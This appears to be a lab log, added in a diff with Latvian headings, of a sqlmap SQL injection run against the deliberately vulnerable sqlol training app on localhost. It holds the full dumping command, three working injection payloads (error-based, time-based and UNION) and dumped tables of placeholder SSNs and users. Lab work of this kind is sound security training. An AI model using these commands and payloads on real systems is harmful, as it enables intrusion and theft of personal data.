@@ -1,0 +1,51 @@
+=================================================================================
+0. Palaistā komanda
+sqlmap -u "http://localhost/MCIR/sqlol/select.php?sanitization_level=high&sanitization_type=keyword&sanitization_params=%27&query_results=all_rows&error_level=verbose&show_query=on&inject_string=1&location=where_int&submit=Inject%21" -p inject_string --dump --risk=3 --level=5
+
+1. Jautājumi, kurus uzdeva SQLMap
+1.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+1.2. GET parameters 'inject_string' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 1708 HTTP(s) requests:
+---
+Parameter: inject_string (GET)
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: sanitization_level=high&sanitization_type=keyword&sanitization_params='&query_results=all_rows&error_level=verbose&show_query=on&inject_string=1 AND GTID_SUBSET(CONCAT(0x71787a7a71,(SELECT (ELT(7836=7836,1))),0x71707a7871),7836)&location=where_int&submit=Inject!
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: sanitization_level=high&sanitization_type=keyword&sanitization_params='&query_results=all_rows&error_level=verbose&show_query=on&inject_string=1 AND (SELECT 2737 FROM (SELECT(SLEEP(5)))tsUC)&location=where_int&submit=Inject!
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: sanitization_level=high&sanitization_type=keyword&sanitization_params='&query_results=all_rows&error_level=verbose&show_query=on&inject_string=1 UNION ALL SELECT CONCAT(0x71787a7a71,0x4772566c4878536b6743614c6d524e645173454446566c6e415062507967685861754e6f5070415a,0x71707a7871)-- -&location=where_int&submit=Inject!
+---
+web application technology: PHP 5.6.40, Apache 2.4.38
+back-end DBMS: MySQL >= 5.6
+Database: sqlol
+Table: ssn
+[5 entries]
++-------------+-----------------------+
+| ssn         | name                  |
++-------------+-----------------------+
+| 000-00-1112 | Wengdack Slobdegoob   |
+| 012-34-5678 | Herp Derper           |
+| 111-22-3333 | Peter Weiner          |
+| 666-67-6776 | Chunk MacRunfast      |
+| 999-99-9999 | SlapdeBack LovedeFace |
++-------------+-----------------------+
+
+Database: sqlol
+Table: users
+[5 entries]
++----+---------+-----------------------+
+| id | isadmin | username              |
++----+---------+-----------------------+
+| 1  | 1       | Herp Derper           |
+| 2  | 1       | SlapdeBack LovedeFace |
+| 3  | 0       | Wengdack Slobdegoob   |
+| 4  | 0       | Chunk MacRunfast      |
+| 5  | 0       | Peter Weiner          |
++----+---------+-----------------------+
+
